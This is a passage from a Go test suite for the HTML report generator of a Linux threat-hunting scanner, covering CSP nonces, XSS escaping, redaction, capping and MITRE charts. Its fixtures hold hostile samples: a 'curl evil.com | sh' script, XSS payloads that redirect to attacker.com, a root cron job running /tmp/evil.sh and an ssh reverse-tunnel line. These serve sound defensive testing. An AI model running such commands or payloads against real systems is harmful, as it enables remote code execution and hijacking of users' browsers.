package htmlreport_test

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"testing"
	"time"

	"aether/internal/config"
	"aether/internal/events"
	"aether/internal/report"
	htmlreport "aether/internal/report/html"
	"aether/internal/scanner"
)

func sampleReportData() htmlreport.HTMLReportData {
	startTime := time.Date(2026, 10, 1, 12, 0, 0, 0, time.UTC)
	return htmlreport.HTMLReportData{
		Version:           "0.1.0-dev",
		Commit:            "a1b2c3d",
		BuildDate:         "2026-10-01T12:00:00Z",
		BinaryName:        "aether",
		Hostname:          "hunt-node-01",
		ScanMode:          "quick",
		StartTime:         startTime,
		Duration:          250 * time.Millisecond,
		TargetPaths:       []string{"/tmp", "/etc", "/dev/shm"},
		Excludes:          []string{"/proc", "/sys"},
		Threads:           4,
		MaxFileSize:       50 * 1024 * 1024,
		Verdict:           events.VerdictSuspicious,
		VerdictReason:     "SUSPICIOUS: 1 warnings, no high-confidence indicators",
		Partial:           true,
		RedactHosts:       false,
		MaxReportFindings: 5000,
		TotalFindings:     3,
		Alerts:            0,
		Warnings:          1,
		Notices:           1,
		Infos:             1,
		FilesScanned:      1420,
		AffectedFiles:     3,
		Coverage: events.CoverageStats{
			FilesScanned:      1420,
			SkippedOversize:   1,
			SkippedPermission: 2,
			SkippedVanished:   0,
			SkippedNotRegular: 3,
			SkippedExcluded:   10,
			OversizeFiles: []events.OversizeFile{
				{Path: "/var/log/huge.log", Size: 60 * 1024 * 1024},
			},
		},
		ModulesRun: []events.ModuleFinished{
			{ModuleName: "process", Duration: 50 * time.Millisecond, InspectedCount: 150, FindingsCount: 0, Status: "OK"},
			{ModuleName: "persistence", Duration: 70 * time.Millisecond, InspectedCount: 80, FindingsCount: 2, Status: "OK"},
			{ModuleName: "filesystem", Duration: 130 * time.Millisecond, InspectedCount: 1420, FindingsCount: 1, Status: "OK"},
		},
		ModulesNotRun:  []string{"yara (not compiled in)"},
		StartupNotices: []string{"running as non-root: coverage limited"},
		PersistenceCoverage: &events.PersistenceCoverageStats{
			TotalInspected:  80,
			TotalUnreadable: 1,
			TotalMasked:     1,
			MaskedPaths:     []string{"/etc/systemd/system/masked.service"},
			UnreadablePaths: []events.UnreadablePersistencePath{
				{Path: "/etc/cron.d/root_only", Reason: "permission denied"},
			},
		},
		TopRules: []report.RuleSummary{
			{RuleName: "Persistence_Cron_Suspicious", Severity: report.SeverityWarning, Count: 1},
			{RuleName: "Suspicious_Hidden_Directory", Severity: report.SeverityNotice, Count: 1},
			{RuleName: "Benign_Service_Hook", Severity: report.SeverityInfo, Count: 1, Acknowledged: true},
		},
		Findings: []report.Finding{
			{
				Timestamp: startTime.Add(10 * time.Millisecond),
				Module:    "persistence",
				Severity:  report.SeverityWarning,
				Path:      "/etc/cron.d/backdoor",
				Reason:    "Executes binary from /tmp via cron",
				RuleName:  "Persistence_Cron_Suspicious",
				Count:     1,
				Hashes:    map[string]string{"SHA256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"},
				Metadata:  map[string]interface{}{"line": "* * * * * root /tmp/evil.sh"},
			},
			{
				Timestamp: startTime.Add(20 * time.Millisecond),
				Module:    "filesystem",
				Severity:  report.SeverityNotice,
				Path:      "/tmp/.hidden_tool",
				Reason:    "Hidden directory in world-writable location",
				RuleName:  "Suspicious_Hidden_Directory",
				Count:     1,
				Metadata:  map[string]interface{}{"owner": "1000"},
			},
			{
				Timestamp: startTime.Add(30 * time.Millisecond),
				Module:    "persistence",
				Severity:  report.SeverityInfo,
				Path:      "/etc/systemd/system/agent.service",
				Reason:    "Routine background agent",
				RuleName:  "Benign_Service_Hook",
				Count:     1,
				Metadata:  map[string]interface{}{"acknowledged": true},
			},
		},
	}
}

// 1. Golden Fixture Test: verifies core sections, metadata, counters, and structure.
func TestHTMLReport_GoldenFixture(t *testing.T) {
	data := sampleReportData()
	htmlBytes, err := htmlreport.GenerateHTMLReport(data)
	if err != nil {
		t.Fatalf("GenerateHTMLReport returned error: %v", err)
	}

	htmlStr := string(htmlBytes)

	// Check core header tags
	if !strings.Contains(htmlStr, "<!DOCTYPE html>") {
		t.Errorf("missing DOCTYPE in HTML output")
	}
	if !strings.Contains(htmlStr, "Aether Threat Hunting Report - hunt-node-01") {
		t.Errorf("missing title in HTML output")
	}
	if !strings.Contains(htmlStr, "hunt-node-01") {
		t.Errorf("missing hostname in metadata card")
	}
	if !strings.Contains(htmlStr, "QUICK") {
		t.Errorf("missing scan mode in metadata card")
	}
	if !strings.Contains(htmlStr, "SUSPICIOUS") {
		t.Errorf("missing verdict in verdict card")
	}
	if !strings.Contains(htmlStr, "PARTIAL COVERAGE") {
		t.Errorf("missing partial coverage badge")
	}
	if !strings.Contains(htmlStr, "Persistence_Cron_Suspicious") {
		t.Errorf("missing rule name in Top Rules or Findings")
	}
	if !strings.Contains(htmlStr, "/var/log/huge.log") {
		t.Errorf("missing oversize file list entry")
	}
	if !strings.Contains(htmlStr, "/etc/cron.d/root_only") {
		t.Errorf("missing unreadable persistence path entry")
	}
	if !strings.Contains(htmlStr, "yara (not compiled in)") {
		t.Errorf("missing modules not run note")
	}
}

// 2. CSP & Nonce Tests
func TestHTMLReport_CSP_And_Nonce(t *testing.T) {
	data := sampleReportData()

	// Generate two reports and verify nonces differ
	rep1, err := htmlreport.GenerateHTMLReport(data)
	if err != nil {
		t.Fatalf("report 1 failed: %v", err)
	}
	rep2, err := htmlreport.GenerateHTMLReport(data)
	if err != nil {
		t.Fatalf("report 2 failed: %v", err)
	}

	reCSP := regexp.MustCompile(`<meta http-equiv="Content-Security-Policy" content="([^"]+)">`)
	m1 := reCSP.FindStringSubmatch(string(rep1))
	m2 := reCSP.FindStringSubmatch(string(rep2))

	if len(m1) < 2 || len(m2) < 2 {
		t.Fatalf("failed to extract CSP meta tag from reports")
	}

	csp1 := m1[1]
	csp2 := m2[1]

	// Verify CSP properties:
	// - Must NOT contain 'strict-dynamic'
	// - Must NOT contain frame-ancestors
	// - Must contain script-src 'nonce-...'
	if strings.Contains(csp1, "strict-dynamic") {
		t.Errorf("CSP must NOT contain strict-dynamic, got: %s", csp1)
	}
	if strings.Contains(csp1, "frame-ancestors") {
		t.Errorf("CSP must NOT claim frame-ancestors, got: %s", csp1)
	}
	if !strings.Contains(csp1, "default-src 'none'") {
		t.Errorf("CSP missing default-src 'none': %s", csp1)
	}
	if !strings.Contains(csp1, "style-src 'unsafe-inline'") {
		t.Errorf("CSP missing style-src 'unsafe-inline': %s", csp1)
	}
	if !strings.Contains(csp1, "img-src data:") {
		t.Errorf("CSP missing img-src data:: %s", csp1)
	}
	if !strings.Contains(csp1, "base-uri 'none'") {
		t.Errorf("CSP missing base-uri 'none': %s", csp1)
	}
	if !strings.Contains(csp1, "form-action 'none'") {
		t.Errorf("CSP missing form-action 'none': %s", csp1)
	}

	reNonce := regexp.MustCompile(`script-src 'nonce-([A-Za-z0-9+/=_-]+)'`)
	nMatch1 := reNonce.FindStringSubmatch(csp1)
	nMatch2 := reNonce.FindStringSubmatch(csp2)
	if len(nMatch1) < 2 || len(nMatch2) < 2 {
		t.Fatalf("failed to extract nonce from CSP")
	}

	nonce1 := nMatch1[1]
	nonce2 := nMatch2[1]

	if nonce1 == nonce2 {
		t.Errorf("expected two reports to have unique nonces, got identical nonce: %s", nonce1)
	}
	if len(nonce1) < 16 {
		t.Errorf("nonce too short: %d chars", len(nonce1))
	}

	// Verify every <script> tag in the report has the exact matching nonce attribute
	reScriptTags := regexp.MustCompile(`<script\b([^>]*)>`)
	scriptMatches := reScriptTags.FindAllStringSubmatch(string(rep1), -1)
	if len(scriptMatches) == 0 {
		t.Fatalf("no script tags found in report")
	}
	for i, sm := range scriptMatches {
		attrs := sm[1]
		expectedNonceAttr := fmt.Sprintf(`nonce="%s"`, nonce1)
		if !strings.Contains(attrs, expectedNonceAttr) {
			t.Errorf("script tag %d missing required nonce attribute %s: %s", i, expectedNonceAttr, sm[0])
		}
	}
}

// 3. Pure DOM Safety Test: verify embedded JS contains ZERO innerHTML, outerHTML, or insertAdjacentHTML.
func TestHTMLReport_JS_NoUnsafeDOM(t *testing.T) {
	data := sampleReportData()
	htmlBytes, err := htmlreport.GenerateHTMLReport(data)
	if err != nil {
		t.Fatalf("GenerateHTMLReport failed: %v", err)
	}

	htmlStr := string(htmlBytes)

	if strings.Contains(htmlStr, "innerHTML") {
		t.Errorf("SECURITY VIOLATION: embedded JS or HTML contains 'innerHTML'")
	}
	if strings.Contains(htmlStr, "outerHTML") {
		t.Errorf("SECURITY VIOLATION: embedded JS or HTML contains 'outerHTML'")
	}
	if strings.Contains(htmlStr, "insertAdjacentHTML") {
		t.Errorf("SECURITY VIOLATION: embedded JS or HTML contains 'insertAdjacentHTML'")
	}
}

// 4. No Remote URLs Test: verify 100% offline air-gapped capability (zero http:// or https://)
func TestHTMLReport_NoRemoteResources(t *testing.T) {
	data := sampleReportData()
	htmlBytes, err := htmlreport.GenerateHTMLReport(data)
	if err != nil {
		t.Fatalf("GenerateHTMLReport failed: %v", err)
	}

	htmlStr := string(htmlBytes)

	// Replace standard SVG xmlns namespace temporarily to test actual resource links
	sanitized := strings.ReplaceAll(htmlStr, "http://www.w3.org/2000/svg", "")
	sanitized = strings.ReplaceAll(sanitized, "http://www.w3.org/1999/xlink", "")

	if strings.Contains(sanitized, "http://") {
		t.Errorf("found disallowed http:// reference in HTML report: %s", findMatchingSubstr(sanitized, "http://"))
	}
	if strings.Contains(sanitized, "https://") {
		t.Errorf("found disallowed https:// reference in HTML report: %s", findMatchingSubstr(sanitized, "https://"))
	}
}

func findMatchingSubstr(s, prefix string) string {
	idx := strings.Index(s, prefix)
	if idx == -1 {
		return ""
	}
	end := idx + 60
	if end > len(s) {
		end = len(s)
	}
	return s[idx:end]
}

// 5. XSS Escaping Test: malicious payload in finding fields is safely escaped
func TestHTMLReport_XSS_Escaping(t *testing.T) {
	data := sampleReportData()
	data.Findings = []report.Finding{
		{
			Timestamp: time.Now(),
			Module:    "filesystem",
			Severity:  report.SeverityAlert,
			Path:      "/tmp/<script>alert(1)</script>/\"malicious\"/'test'",
			Reason:    "Payload with <img src=x onerror=alert(1)> and & ampersand",
			RuleName:  "XSS_<Test>_Rule\"&'",
			Count:     1,
			Metadata: map[string]interface{}{
				"evil_key": "<script>document.location='http://attacker.com'</script>",
			},
		},
	}
	data.TotalFindings = 1
	data.Alerts = 1

	htmlBytes, err := htmlreport.GenerateHTMLReport(data)
	if err != nil {
		t.Fatalf("GenerateHTMLReport failed: %v", err)
	}

	htmlStr := string(htmlBytes)

	// In the HTML data, raw <script> from the payload must NOT appear.
	// Only the application/json script block and the inline logic script block with nonces are allowed.
	reScripts := regexp.MustCompile(`<script\b[^>]*>([\s\S]*?)</script>`)
	allScripts := reScripts.FindAllString(htmlStr, -1)
	if len(allScripts) != 2 {
		t.Errorf("expected exactly 2 <script> blocks (data and logic), found %d", len(allScripts))
	}

	// Inside the data block, '<' must be escaped as \u003c
	if strings.Contains(htmlStr, `alert(1)</script>`) {
		t.Errorf("found unescaped payload script closing tag in HTML report")
	}
	if !strings.Contains(htmlStr, `\u003cscript\u003ealert(1)\u003c/script\u003e`) {
		t.Errorf("expected json payload to have < escaped as \\u003c")
	}
}

// 6. Redaction Test: --redact-hosts masks IP, username, hostname, and /home/<name>
func TestHTMLReport_RedactHosts(t *testing.T) {
	hostname := "target-server-99"
	data := sampleReportData()
	data.Hostname = hostname
	data.RedactHosts = true
	data.Findings = []report.Finding{
		{
			Timestamp: time.Now(),
			Module:    "persistence",
			Severity:  report.SeverityWarning,
			Path:      "/home/victim_user/.ssh/authorized_keys",
			Reason:    "Reverse tunnel configured: autossh -l remote_operator 192.168.10.45 or 2001:db8::1 from target-server-99 with user alice@target-server-99",
			RuleName:  "Persistence_Autostart_Tunnel",
			Count:     1,
			Metadata: map[string]interface{}{
				"snippet": "ssh -R 8080:localhost:80 victim_user@10.20.30.40",
			},
		},
	}

	// Apply redaction to finding
	for i := range data.Findings {
		report.RedactFinding(&data.Findings[i], hostname)
	}

	htmlBytes, err := htmlreport.GenerateHTMLReport(data)
	if err != nil {
		t.Fatalf("GenerateHTMLReport failed: %v", err)
	}

	htmlStr := string(htmlBytes)

	// Verify that raw IPs are nowhere in the output
	rawSensitiveTokens := []string{
		"192.168.10.45",
		"10.20.30.40",
		"2001:db8::1",
		"victim_user",
		"remote_operator",
		"target-server-99",
	}

	for _, token := range rawSensitiveTokens {
		if strings.Contains(htmlStr, token) {
			t.Errorf("SECURITY/PRIVACY VIOLATION: raw sensitive token %q found in redacted HTML report", token)
		}
	}

	// Verify presence of redaction masks
	if !strings.Contains(htmlStr, "[REDACTED_HOST]") {
		t.Errorf("expected [REDACTED_HOST] in report")
	}
	if !strings.Contains(htmlStr, "[REDACTED_IP]") {
		t.Errorf("expected [REDACTED_IP] in report")
	}
	if !strings.Contains(htmlStr, "/home/[user]") {
		t.Errorf("expected /home/[user] in report path")
	}
	if !strings.Contains(htmlStr, "REDACTED MODE") {
		t.Errorf("expected REDACTED MODE badge in report header")
	}
}

// 7. Capping Test: findings table capped at max_report_findings with a visible notice
func TestHTMLReport_FindingsCapping(t *testing.T) {
	data := sampleReportData()
	data.MaxReportFindings = 2

	var findings []report.Finding
	for i := 1; i <= 5; i++ {
		findings = append(findings, report.Finding{
			Timestamp: time.Now(),
			Module:    "filesystem",
			Severity:  report.SeverityNotice,
			Path:      fmt.Sprintf("/tmp/file_%d", i),
			Reason:    fmt.Sprintf("Finding item %d", i),
			RuleName:  "Test_Rule",
			Count:     1,
		})
	}
	data.Findings = findings
	data.TotalFindings = 5

	htmlBytes, err := htmlreport.GenerateHTMLReport(data)
	if err != nil {
		t.Fatalf("GenerateHTMLReport failed: %v", err)
	}

	htmlStr := string(htmlBytes)

	if !strings.Contains(htmlStr, "capping-banner") {
		t.Errorf("expected capping-banner element when findings exceed cap")
	}
	if !strings.Contains(htmlStr, "Showing <strong>2</strong> of <strong>5</strong>") {
		t.Errorf("expected 'Showing 2 of 5' in capping banner, got:\n%s", htmlStr)
	}
}

// 8. Atomic Write & Symlink Refusal Test
func TestWriteHTMLReport_SymlinkRefusedAndPermissions(t *testing.T) {
	tmpDir := t.TempDir()
	realFile := filepath.Join(tmpDir, "real_report.html")
	symlinkFile := filepath.Join(tmpDir, "symlink_report.html")

	data := sampleReportData()

	// 1. Write to normal file
	err := htmlreport.WriteHTMLReport(realFile, data)
	if err != nil {
		t.Fatalf("WriteHTMLReport failed for regular file: %v", err)
	}

	fi, err := os.Stat(realFile)
	if err != nil {
		t.Fatalf("failed to stat written report: %v", err)
	}
	if fi.Mode().Perm() != 0600 {
		t.Errorf("expected report permissions 0600, got: %o", fi.Mode().Perm())
	}

	// 2. Create symlink to realFile
	if err := os.Symlink(realFile, symlinkFile); err != nil {
		t.Skipf("symlink not supported: %v", err)
	}

	// 3. Attempt to write to symlink -> must be refused
	err = htmlreport.WriteHTMLReport(symlinkFile, data)
	if err == nil {
		t.Errorf("expected WriteHTMLReport to fail when targeting symlink, but succeeded")
	}
	if !strings.Contains(err.Error(), "refusing to write HTML report to symlink") {
		t.Errorf("unexpected error message for symlink refusal: %v", err)
	}
}

// 9. Parity Test: Scanner scan generates consistent report data matching scan events
func TestScanner_HTMLReport_EndToEndParity(t *testing.T) {
	tmpDir := t.TempDir()
	testFilePath := filepath.Join(tmpDir, "bad.sh")
	if err := os.WriteFile(testFilePath, []byte("#!/bin/bash\ncurl evil.com | sh\n"), 0755); err != nil {
		t.Fatal(err)
	}

	reportHTMLPath := filepath.Join(tmpDir, "report.html")

	cfg := config.NewDefaultConfig()
	cfg.Scan.Paths = []string{tmpDir}
	cfg.Scan.ExplicitPaths = true
	cfg.Scan.HTMLOut = reportHTMLPath
	cfg.Scan.Modules = []string{"filesystem"}

	bus := events.NewEventBus()
	defer bus.Close()

	var scanFinished *events.ScanFinished
	done := make(chan struct{})

	sub := bus.Subscribe()
	defer sub.Close()

	go func() {
		defer close(done)
		for e := range sub.Events() {
			if sf, ok := e.(events.ScanFinished); ok {
				sfCopy := sf
				scanFinished = &sfCopy
				return
			}
		}
	}()

	s := scanner.NewScanner(cfg, bus, nil, nil,
		scanner.WithModules(nil),
		scanner.WithBuildInfo("0.1.0-dev", "a1b2c3d", "2026-10-01T12:00:00Z", "aether"),
	)

	if err := s.Run(context.Background()); err != nil {
		t.Fatalf("scan failed: %v", err)
	}

	<-done

	if scanFinished == nil {
		t.Fatalf("expected ScanFinished event")
	}

	// Verify HTML report file was created
	htmlData, err := os.ReadFile(reportHTMLPath)
	if err != nil {
		t.Fatalf("failed to read generated HTML report: %v", err)
	}

	htmlStr := string(htmlData)

	// Check parity of verdicts and metrics
	if !strings.Contains(htmlStr, string(scanFinished.Verdict)) {
		t.Errorf("HTML report does not contain verdict %s", scanFinished.Verdict)
	}
	if !strings.Contains(htmlStr, fmt.Sprintf("%d", scanFinished.TotalFindings)) {
		t.Errorf("HTML report does not contain total findings count %d", scanFinished.TotalFindings)
	}
	if !strings.Contains(htmlStr, fmt.Sprintf("%d", scanFinished.FilesScanned)) {
		t.Errorf("HTML report does not contain files scanned count %d", scanFinished.FilesScanned)
	}
}

// 10. Direct Equivalence Test: HTML report data metrics equal Plain consumer rendered metrics
func TestHTMLReport_PlainAndScanFinished_Parity(t *testing.T) {
	data := sampleReportData()

	htmlBytes, err := htmlreport.GenerateHTMLReport(data)
	if err != nil {
		t.Fatalf("GenerateHTMLReport failed: %v", err)
	}
	htmlStr := string(htmlBytes)

	// Verify all counts match
	if !strings.Contains(htmlStr, fmt.Sprintf("Total Findings</span></div>\n<div class=\"card counter-card sev-alert\"><span class=\"counter-num\">%d", data.Alerts)) &&
		!strings.Contains(htmlStr, fmt.Sprintf(">%d</span><span class=\"counter-lbl\">Alerts<", data.Alerts)) {
		t.Errorf("Alerts count mismatch in HTML report")
	}
	if !strings.Contains(htmlStr, fmt.Sprintf(">%d</span><span class=\"counter-lbl\">Warnings<", data.Warnings)) {
		t.Errorf("Warnings count mismatch in HTML report")
	}
	if !strings.Contains(htmlStr, fmt.Sprintf(">%d</span><span class=\"counter-lbl\">Notices<", data.Notices)) {
		t.Errorf("Notices count mismatch in HTML report")
	}
	if !strings.Contains(htmlStr, fmt.Sprintf(">%d</span><span class=\"counter-lbl\">Infos<", data.Infos)) {
		t.Errorf("Infos count mismatch in HTML report")
	}
	if !strings.Contains(htmlStr, fmt.Sprintf(">%d</span><span class=\"counter-lbl\">Total Findings<", data.TotalFindings)) {
		t.Errorf("Total findings count mismatch in HTML report")
	}

	// Verify coverage reasons and skipped counts
	if !strings.Contains(htmlStr, fmt.Sprintf("Files Skipped: <strong>%d</strong>", data.Coverage.TotalSkipped())) {
		t.Errorf("Skipped count mismatch in HTML report")
	}
	if !strings.Contains(htmlStr, "/var/log/huge.log") {
		t.Errorf("Oversize file list mismatch in HTML report")
	}
	if !strings.Contains(htmlStr, "/etc/cron.d/root_only") {
		t.Errorf("Unreadable persistence path mismatch in HTML report")
	}
	if !strings.Contains(htmlStr, "/etc/systemd/system/masked.service") {
		t.Errorf("Masked persistence units mismatch in HTML report")
	}

	// Verify modules not run
	for _, mnr := range data.ModulesNotRun {
		if !strings.Contains(htmlStr, mnr) {
			t.Errorf("Modules not run entry %q missing from HTML report", mnr)
		}
	}
}

func TestHTMLReport_ExecutivePostureAndTiming(t *testing.T) {
	data := sampleReportData()
	data.SystemPosture = "HIGH_RISK"
	data.PostureRationale = "Active weaponized threat detected on host."
	data.RemediationPlan = []htmlreport.RemediationAction{
		{
			Priority:    1,
			Title:       "Terminate C2 Shell",
			Description: "Kill malicious process immediately.",
			Command:     "kill -9 1234",
		},
	}
	data.DurationBreakdown = map[string]string{
		"filesystem_walk": "45ms",
		"yara":            "12ms",
		"total_duration":  (120 * time.Millisecond).String(),
	}

	htmlBytes, err := htmlreport.GenerateHTMLReport(data)
	if err != nil {
		t.Fatalf("GenerateHTMLReport failed: %v", err)
	}

	htmlStr := string(htmlBytes)
	if !strings.Contains(htmlStr, "HIGH RISK") {
		t.Errorf("missing HIGH RISK posture badge in html")
	}
	if !strings.Contains(htmlStr, "Active weaponized threat detected on host.") {
		t.Errorf("missing posture rationale in html")
	}
	if !strings.Contains(htmlStr, "Terminate C2 Shell") {
		t.Errorf("missing remediation action title in html")
	}
	if !strings.Contains(htmlStr, "kill -9 1234") {
		t.Errorf("missing remediation command in html")
	}
	if !strings.Contains(htmlStr, "Filesystem Walk") || !strings.Contains(htmlStr, "45ms") {
		t.Errorf("missing filesystem walk timing in html")
	}
}

func TestHTMLReport_DonutChartAndMITREHeatmap(t *testing.T) {
	data := sampleReportData()
	data.Findings = []report.Finding{
		{
			Timestamp: time.Now(),
			Module:    "persistence",
			Severity:  report.SeverityAlert,
			Path:      "/etc/cron.d/evil",
			RuleName:  "Persistence_Cron_Suspicious",
			Reason:    "Malicious cron job",
			Why:       "Allows persistent background execution as root",
			MITRE: []report.MITREMapping{
				{Tactic: "Persistence", Technique: "T1053.003", TechniqueName: "Cron"},
				{Tactic: "Execution", Technique: "T1059.004", TechniqueName: "Unix Shell"},
			},
		},
		{
			Timestamp: time.Now(),
			Module:    "filesystem",
			Severity:  report.SeverityWarning,
			Path:      "/tmp/.hidden",
			RuleName:  "Suspicious_Hidden_Directory",
			Reason:    "Hidden directory in /tmp",
			MITRE: []report.MITREMapping{
				{Tactic: "Defense Evasion", Technique: "T1564.001", TechniqueName: "Hidden Files and Directories"},
			},
		},
	}
	data.TotalFindings = 2
	data.Alerts = 1
	data.Warnings = 1
	data.Notices = 0
	data.Infos = 0

	htmlBytes, err := htmlreport.GenerateHTMLReport(data)
	if err != nil {
		t.Fatalf("GenerateHTMLReport failed: %v", err)
	}

	htmlStr := string(htmlBytes)

	// 1. Verify Donut Chart SVG
	if !strings.Contains(htmlStr, "donut-svg") {
		t.Errorf("missing donut-svg element in HTML report")
	}
	if !strings.Contains(htmlStr, "stroke-dasharray") {
		t.Errorf("missing stroke-dasharray in donut chart SVG")
	}

	// 2. Verify MITRE ATT&CK Heat-Map Matrix
	if !strings.Contains(htmlStr, "mitre-matrix-section") {
		t.Errorf("missing mitre-matrix-section in HTML report")
	}
	if !strings.Contains(htmlStr, "Persistence") || !strings.Contains(htmlStr, "T1053.003") {
		t.Errorf("missing Persistence / T1053.003 technique chip in MITRE matrix")
	}
	if !strings.Contains(htmlStr, "Defense Evasion") || !strings.Contains(htmlStr, "T1564.001") {
		t.Errorf("missing Defense Evasion / T1564.001 technique chip in MITRE matrix")
	}

	// 3. Verify CSV & Print Buttons
	if !strings.Contains(htmlStr, "id=\"btn-export-csv\"") {
		t.Errorf("missing btn-export-csv in HTML report")
	}
	if !strings.Contains(htmlStr, "id=\"btn-print\"") {
		t.Errorf("missing btn-print in HTML report")
	}

	// 4. Verify Drawer Navigation Controls
	if !strings.Contains(htmlStr, "id=\"drawer-prev\"") || !strings.Contains(htmlStr, "id=\"drawer-next\"") {
		t.Errorf("missing drawer-prev or drawer-next in HTML report")
	}
	if !strings.Contains(htmlStr, "id=\"drawer-index-badge\"") {
		t.Errorf("missing drawer-index-badge in HTML report")
	}
}

func TestHTMLReport_CleanMITREBanner(t *testing.T) {
	data := sampleReportData()
	data.Findings = nil
	data.TotalFindings = 0
	data.Alerts = 0
	data.Warnings = 0
	data.Notices = 0
	data.Infos = 0

	htmlBytes, err := htmlreport.GenerateHTMLReport(data)
	if err != nil {
		t.Fatalf("GenerateHTMLReport failed: %v", err)
	}

	htmlStr := string(htmlBytes)
	if !strings.Contains(htmlStr, "Zero Active MITRE ATT&CK") {
		t.Errorf("missing Zero Active MITRE ATT&CK clean banner for clean scan")
	}
}

func TestHTMLReport_ExportJSONAndSeniorStudioFeatures(t *testing.T) {
	data := sampleReportData()
	htmlBytes, err := htmlreport.GenerateHTMLReport(data)
	if err != nil {
		t.Fatalf("GenerateHTMLReport failed: %v", err)
	}

	htmlStr := string(htmlBytes)

	// 1. Export JSON button
	if !strings.Contains(htmlStr, "id=\"btn-export-json\"") {
		t.Errorf("missing btn-export-json in HTML report header")
	}

	// 2. Donut segment class for stroke-dashoffset animation
	if !strings.Contains(htmlStr, "class=\"donut-segment\"") {
		t.Errorf("missing donut-segment class in SVG donut chart")
	}

	// 3. Search highlighting and code line numbers in CSS/JS
	if !strings.Contains(htmlStr, "search-highlight") {
		t.Errorf("missing search-highlight class in HTML report")
	}
	if !strings.Contains(htmlStr, "code-block-lines") {
		t.Errorf("missing code-block-lines class in HTML report")
	}

	// 4. Modal accessibility
	if !strings.Contains(htmlStr, "aria-modal") {
		t.Errorf("missing aria-modal attribute in drawer JS")
	}
}

// 14. Severity Vocabulary Normalization: findings carrying the extended vocabulary
// (CRITICAL/HIGH/MEDIUM/LOW) must fold onto the four canonical bands so badges
// stay styled and the ALERT/WARNING/NOTICE/INFO filter pills remain exhaustive.
func TestHTMLReport_SeverityVocabularyNormalized(t *testing.T) {
	data := sampleReportData()
	startTime := time.Date(2026, 10, 1, 12, 0, 0, 0, time.UTC)
	data.Findings = []report.Finding{
		{Timestamp: startTime, Module: "filesystem", Severity: report.SeverityCritical, Path: "/tmp/x1", Reason: "r1", RuleName: "R1"},
		{Timestamp: startTime, Module: "filesystem", Severity: report.SeverityHigh, Path: "/tmp/x2", Reason: "r2", RuleName: "R2"},
		{Timestamp: startTime, Module: "filesystem", Severity: report.SeverityMedium, Path: "/tmp/x3", Reason: "r3", RuleName: "R3"},
		{Timestamp: startTime, Module: "filesystem", Severity: report.SeverityLow, Path: "/tmp/x4", Reason: "r4", RuleName: "R4"},
	}
	data.TopRules = []report.RuleSummary{
		{RuleName: "R1", Severity: report.SeverityCritical, Count: 1},
		{RuleName: "R2", Severity: report.SeverityHigh, Count: 1},
	}

	rep, err := htmlreport.GenerateHTMLReport(data)
	if err != nil {
		t.Fatalf("report generation failed: %v", err)
	}
	out := string(rep)

	for _, banned := range []string{"sev-critical", "sev-high", "sev-medium", "sev-low", `"severity":"CRITICAL"`, `"severity":"HIGH"`, `"severity":"MEDIUM"`, `"severity":"LOW"`} {
		if strings.Contains(out, banned) {
			t.Errorf("extended severity vocabulary leaked into report: %q", banned)
		}
	}
	for _, required := range []string{`"severity":"ALERT"`, `"severity":"WARNING"`, `"severity":"NOTICE"`, `"severity":"INFO"`} {
		if !strings.Contains(out, required) {
			t.Errorf("canonical severity %s missing from embedded findings payload", required)
		}
	}
	if !strings.Contains(out, "sev-alert") || !strings.Contains(out, "sev-warning") {
		t.Errorf("top-rules badges missing canonical classes")
	}
}

// 15. Donut Theme Contrast: the donut track and center labels must resolve
// through theme-aware CSS classes, never hard-coded dark-only colors.
func TestHTMLReport_Donut_ThemeClasses(t *testing.T) {
	data := sampleReportData()

	rep, err := htmlreport.GenerateHTMLReport(data)
	if err != nil {
		t.Fatalf("report generation failed: %v", err)
	}
	out := string(rep)

	if !strings.Contains(out, `class="donut-track"`) {
		t.Errorf("donut track missing theme-aware class")
	}
	if strings.Contains(out, `stroke="#1f2937"`) {
		t.Errorf("donut track still hard-codes dark-theme stroke color")
	}
	if !strings.Contains(out, "donut-center-text") || !strings.Contains(out, "donut-center-muted") {
		t.Errorf("donut center labels missing theme-aware classes")
	}
	if !strings.Contains(out, `[data-theme="light"] .donut-track`) {
		t.Errorf("light theme override for donut track missing")
	}
}

// 16. Kill-Chain Coverage Strip: the strip must render every stage, honor
// detection counts per tactic, and resolve colors through theme CSS classes.
func TestHTMLReport_KillchainStrip(t *testing.T) {
	data := sampleReportData()
	startTime := time.Date(2026, 10, 1, 12, 0, 0, 0, time.UTC)
	data.Findings = []report.Finding{
		{
			Timestamp: startTime,
			Module:    "persistence",
			Severity:  report.SeverityAlert,
			Path:      "/etc/ld.so.preload",
			Reason:    "Rogue preload entry",
			RuleName:  "Persistence_Linker_Audit_Hijack",
			Count:     1,
			MITRE: []report.MITREMapping{
				{Tactic: "Persistence", Technique: "T1574.006", TechniqueName: "Dynamic Linker Hijacking"},
			},
		},
		{
			Timestamp: startTime.Add(50 * time.Millisecond),
			Module:    "persistence",
			Severity:  report.SeverityWarning,
			Path:      "/etc/systemd/system/rogue.service",
			Reason:    "Suspicious unit executes from volatile dir",
			RuleName:  "Persistence_Systemd_Suspicious",
			Count:     1,
			MITRE: []report.MITREMapping{
				{Tactic: "Persistence", Technique: "T1543.002", TechniqueName: "Systemd Service"},
			},
		},
	}

	rep, err := htmlreport.GenerateHTMLReport(data)
	if err != nil {
		t.Fatalf("report generation failed: %v", err)
	}
	out := string(rep)

	if !strings.Contains(out, `class="killchain-svg"`) {
		t.Error("kill-chain SVG missing from report")
	}
	if !strings.Contains(out, "Adversary Kill-Chain Coverage") {
		t.Error("kill-chain section heading missing")
	}
	// Hooks with 2 mapped detections must show the mid-intensity node.
	if !strings.Contains(out, `<title>Persistence — 2 finding(s)</title>`) {
		t.Error("kill-chain node must surface the tactic detection count")
	}
	if !strings.Contains(out, "kill-intensity-mid") {
		t.Error("expected mid-intensity node class for a hooked stage")
	}
	for _, want := range []string{"INITIAL ACCESS", "EXECUTION", "PERSISTENCE", "CMD AND CTRL", "IMPACT"} {
		if !strings.Contains(out, want) {
			t.Errorf("kill-chain stage label %q missing", want)
		}
	}
	if strings.Count(out, `class="kill-stage kill-stage-none"`) != 11 {
		t.Errorf("expected exactly 11 empty stages (only Persistence hooked), got %d", strings.Count(out, `class="kill-stage kill-stage-none"`))
	}
	// Narrative order: Initial Access must precede Execution and Persistence.
	idxInitial := strings.Index(out, "INITIAL ACCESS")
	idxExec := strings.Index(out, "EXECUTION")
	idxPersist := strings.Index(out, "PERSISTENCE")
	if !(idxInitial < idxExec && idxExec < idxPersist) {
